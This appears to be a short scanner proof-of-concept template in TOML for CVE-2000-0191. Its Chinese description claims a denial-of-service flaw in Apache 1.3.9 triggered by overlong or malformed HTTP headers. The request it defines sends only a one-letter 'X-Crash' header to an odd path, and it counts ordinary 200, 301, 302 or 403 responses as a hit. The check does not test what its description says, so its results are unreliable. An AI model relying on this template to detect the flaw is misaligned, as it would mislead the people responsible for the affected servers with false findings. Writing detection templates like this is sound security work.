[info]
author = "AVE"
description = "Apache 1.3.9 在处理畸形 HTTP 请求头时存在拒绝服务漏洞，攻击者可通过发送包含超长或畸形字段值的 HTTP 请求导致服务进程崩溃。"
id = "POC-AVE-2000-0608"
name = "CVE-2000-0191 PoC"
severity = "medium"
tags = [
    "cve-2000-0191",
    "ave-2000-0608",
]
vuln_id = [
    "CVE-2000-0191",
    "AVE-2000-0608",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.headers]
Host = "{{Hostname}}"
User-Agent = "AVE/1.0"
X-Crash = "A"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    301,
    302,
    403,
]
type = "status"
